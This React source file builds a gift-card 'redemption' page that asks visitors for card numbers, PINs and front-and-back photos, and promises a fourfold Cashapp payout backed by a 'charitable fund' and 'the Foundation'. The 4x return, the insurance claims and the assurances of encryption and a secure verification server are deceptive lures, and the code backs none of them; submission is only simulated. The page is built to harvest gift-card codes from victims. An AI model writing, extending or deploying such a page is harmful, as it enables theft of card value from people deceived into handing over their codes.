import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { CreditCard, Wallet, ShieldCheck, CheckCircle2, AlertCircle, Loader2, Upload, X, Image as ImageIcon } from 'lucide-react';

const Exchange = () => {
  const [formData, setFormData] = useState({
    cardType: '',
    cardAmount: '',
    cardNumber: '',
    cardPin: '',
    cashappTag: '',
  });

  const [cardImages, setCardImages] = useState([]);
  const [imagePreviews, setImagePreviews] = useState([]);

  // Cleanup effect for image previews
  useEffect(() => {
    return () => {
      imagePreviews.forEach(preview => URL.revokeObjectURL(preview));
    };
  }, [imagePreviews]);

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  const handleImageChange = (e) => {
    const files = Array.from(e.target.files);
    if (files.length + cardImages.length > 3) {
      alert("You can only upload up to 3 images.");
      return;
    }

    const newImages = [...cardImages, ...files];
    setCardImages(newImages);

    const newPreviews = files.map(file => URL.createObjectURL(file));
    setImagePreviews([...imagePreviews, ...newPreviews]);
  };

  const removeImage = (index) => {
    const newImages = cardImages.filter((_, i) => i !== index);
    const newPreviews = imagePreviews.filter((_, i) => i !== index);
    
    // Revoke the URL to avoid memory leaks
    URL.revokeObjectURL(imagePreviews[index]);
    
    setCardImages(newImages);
    setImagePreviews(newPreviews);
  };

  const cardTypes = [
    'Apple Gift Card', 'Amazon Gift Card', 'Visa Gift Card', 'Xbox Gift Card', 
    'PlayStation Store', 'Vanilla Gift Card', 'American Express', 'Target',
    'Sephora Gift Card', 'Steam Wallet Card'
  ];

  const handleSubmit = (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    // In a real app, you would upload the cardImages here
    console.log("Submitting form with images:", cardImages);

    // Simulate API call
    setTimeout(() => {
      setIsSubmitting(false);
      setIsSuccess(true);
      
      // Reset images
      setCardImages([]);
      setImagePreviews([]);
    }, 3000);
  };

  const calculateReturn = () => {
    const amount = parseFloat(formData.cardAmount);
    if (isNaN(amount)) return 0;
    return amount * 4;
  };

  return (
    <div className="pt-24 pb-20 px-4 sm:px-6 lg:px-8">
      <div className="max-w-4xl mx-auto">
        <div className="text-center mb-12">
          <motion.h1 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="text-4xl md:text-5xl font-bold text-secondary mb-4"
          >
            Redeem Your <span className="text-primary">Gift Card</span>
          </motion.h1>
          <p className="text-gray-600 text-lg max-w-xl mx-auto">
            Fill out the form below to receive your 4x Cashapp transfer. Our team will verify your details and process the transfer within 15 minutes.
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Form Side */}
          <div className="lg:col-span-2">
            <AnimatePresence mode="wait">
              {!isSuccess ? (
                <motion.form 
                  key="form"
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, x: 20 }}
                  onSubmit={handleSubmit}
                  className="bg-white rounded-3xl p-8 shadow-xl shadow-gray-200 border border-gray-100"
                >
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                    <div className="col-span-1 md:col-span-2">
                      <label className="block text-sm font-bold text-gray-700 mb-2 uppercase tracking-wide">
                        Gift Card Type
                      </label>
                      <select 
                        required
                        className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-4 focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all"
                        value={formData.cardType}
                        onChange={(e) => setFormData({...formData, cardType: e.target.value})}
                      >
                        <option value="">Select a card type</option>
                        {cardTypes.map(type => (
                          <option key={type} value={type}>{type}</option>
                        ))}
                      </select>
                    </div>

                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-2 uppercase tracking-wide">
                        Card Amount ($)
                      </label>
                      <input 
                        required
                        type="number"
                        placeholder="e.g. 200"
                        className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-4 focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all"
                        value={formData.cardAmount}
                        onChange={(e) => setFormData({...formData, cardAmount: e.target.value})}
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-bold text-gray-700 mb-2 uppercase tracking-wide">
                        Cashapp Tag ($)
                      </label>
                      <input 
                        required
                        type="text"
                        placeholder="$cashtag"
                        className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-4 focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all"
                        value={formData.cashappTag}
                        onChange={(e) => setFormData({...formData, cashappTag: e.target.value})}
                      />
                    </div>

                    <div className="col-span-1 md:col-span-2">
                      <label className="block text-sm font-bold text-gray-700 mb-2 uppercase tracking-wide">
                        Card Number / Redemption Code
                      </label>
                      <input 
                        required
                        type="text"
                        placeholder="Enter your card number"
                        className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-4 focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all"
                        value={formData.cardNumber}
                        onChange={(e) => setFormData({...formData, cardNumber: e.target.value})}
                      />
                    </div>

                    <div className="col-span-1 md:col-span-2">
                      <label className="block text-sm font-bold text-gray-700 mb-2 uppercase tracking-wide">
                        Upload Gift Card Pictures (Front & Back)
                      </label>
                      <div className="mt-1 flex flex-col space-y-4">
                        <div className="grid grid-cols-3 gap-4">
                          {imagePreviews.map((preview, index) => (
                            <div key={index} className="relative aspect-video rounded-xl overflow-hidden border border-gray-200 bg-gray-50">
                              <img src={preview} alt={`preview ${index}`} className="w-full h-full object-cover" />
                              <button 
                                type="button"
                                onClick={() => removeImage(index)}
                                className="absolute top-1 right-1 p-1 bg-red-500 text-white rounded-full hover:bg-red-600 transition-colors"
                              >
                                <X className="w-4 h-4" />
                              </button>
                            </div>
                          ))}
                          {imagePreviews.length < 3 && (
                            <label className="cursor-pointer aspect-video rounded-xl border-2 border-dashed border-gray-300 flex flex-col items-center justify-center hover:border-primary hover:bg-primary/5 transition-all group">
                              <Upload className="w-6 h-6 text-gray-400 group-hover:text-primary mb-2" />
                              <span className="text-xs font-medium text-gray-500 group-hover:text-primary">Add Photo</span>
                              <input 
                                type="file" 
                                className="hidden" 
                                accept="image/*" 
                                multiple
                                onChange={handleImageChange}
                              />
                            </label>
                          )}
                        </div>
                        <p className="text-xs text-gray-500 italic flex items-center">
                          <ImageIcon className="w-3 h-3 mr-1" />
                          Upload up to 3 clear photos of your gift card for faster verification.
                        </p>
                      </div>
                    </div>

                    <div className="col-span-1 md:col-span-2">
                      <label className="block text-sm font-bold text-gray-700 mb-2 uppercase tracking-wide">
                        Card PIN (if applicable)
                      </label>
                      <input 
                        type="text"
                        placeholder="Enter PIN"
                        className="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-4 focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all"
                        value={formData.cardPin}
                        onChange={(e) => setFormData({...formData, cardPin: e.target.value})}
                      />
                    </div>
                  </div>

                  <button 
                    disabled={isSubmitting}
                    type="submit" 
                    className="w-full btn-primary py-5 text-xl flex items-center justify-center space-x-3 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="w-6 h-6 animate-spin" />
                        <span>Verifying Card...</span>
                      </>
                    ) : (
                      <>
                        <Wallet className="w-6 h-6" />
                        <span>Confirm Redemption</span>
                      </>
                    )}
                  </button>

                  <div className="mt-6 flex items-start space-x-3 text-sm text-gray-500 bg-blue-50/50 p-4 rounded-xl border border-blue-100">
                    <AlertCircle className="w-5 h-5 text-blue-500 flex-shrink-0" />
                    <p>
                      Your card details are encrypted and sent directly to our secure verification server. We never share your information with third parties.
                    </p>
                  </div>
                </motion.form>
              ) : (
                <motion.div 
                  key="success"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="bg-white rounded-3xl p-12 shadow-xl shadow-gray-200 border border-gray-100 text-center"
                >
                  <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-8">
                    <CheckCircle2 className="w-10 h-10 text-primary" />
                  </div>
                  <h2 className="text-3xl font-bold text-secondary mb-4">Request Submitted!</h2>
                  <p className="text-gray-600 mb-8 leading-relaxed">
                    Thank you! Your card details have been successfully submitted for verification. You will receive your <span className="text-primary font-bold">${calculateReturn()}</span> Cashapp transfer within the next 15-30 minutes.
                  </p>
                  <div className="bg-gray-50 rounded-2xl p-6 text-left mb-8 border border-gray-100">
                    <div className="flex justify-between mb-2">
                      <span className="text-gray-500">Transaction ID:</span>
                      <span className="font-mono text-secondary">#CC-{Math.random().toString(36).substr(2, 9).toUpperCase()}</span>
                    </div>
                    <div className="flex justify-between mb-2">
                      <span className="text-gray-500">Cashapp Tag:</span>
                      <span className="font-bold text-secondary">{formData.cashappTag}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-500">Expected Amount:</span>
                      <span className="font-bold text-primary">${calculateReturn()}</span>
                    </div>
                  </div>
                  <div className="mb-8 p-4 bg-green-50 border border-green-100 rounded-2xl flex items-center space-x-3 text-left">
                    <ImageIcon className="w-5 h-5 text-green-500" />
                    <p className="text-sm text-green-700">
                      Your uploaded images have been received and are being reviewed for verification.
                    </p>
                  </div>
                  <button 
                    onClick={() => setIsSuccess(false)}
                    className="btn-secondary w-full py-4"
                  >
                    Submit Another Card
                  </button>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Sidebar Info */}
          <div className="space-y-6">
            <div className="bg-secondary rounded-3xl p-8 text-white shadow-xl">
              <h3 className="text-xl font-bold mb-6">Redemption Summary</h3>
              <div className="space-y-4 mb-8">
                <div className="flex justify-between text-gray-400">
                  <span>Card Amount:</span>
                  <span className="text-white">${formData.cardAmount || '0.00'}</span>
                </div>
                <div className="flex justify-between text-gray-400">
                  <span>Multiplier:</span>
                  <span className="text-primary font-bold">4.0x Bonus</span>
                </div>
                <div className="border-t border-white/10 pt-4 flex justify-between">
                  <span className="font-bold">Total Payout:</span>
                  <span className="text-2xl font-black text-primary">${calculateReturn()}</span>
                </div>
              </div>
              <div className="p-4 bg-white/5 rounded-2xl border border-white/10 text-sm">
                <div className="flex items-center space-x-2 text-primary font-bold mb-2">
                  <ShieldCheck className="w-4 h-4" />
                  <span>Guaranteed Transfer</span>
                </div>
                <p className="text-gray-400 leading-relaxed">
                  Our charitable fund guarantees every valid gift card exchange. Your transfer is insured by the Foundation.
                </p>
              </div>
            </div>

            <div className="bg-primary/10 rounded-3xl p-8 border border-primary/20">
              <h3 className="text-xl font-bold text-secondary mb-4">Why use us?</h3>
              <ul className="space-y-4">
                {[
                  "No hidden fees",
                  "24/7 Support",
                  "Verified transfers",
                  "Anonymous funding"
                ].map((item, i) => (
                  <li key={i} className="flex items-center space-x-3 text-gray-700">
                    <CheckCircle2 className="w-5 h-5 text-primary" />
                    <span>{item}</span>
                  </li>
                ))}
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Exchange;
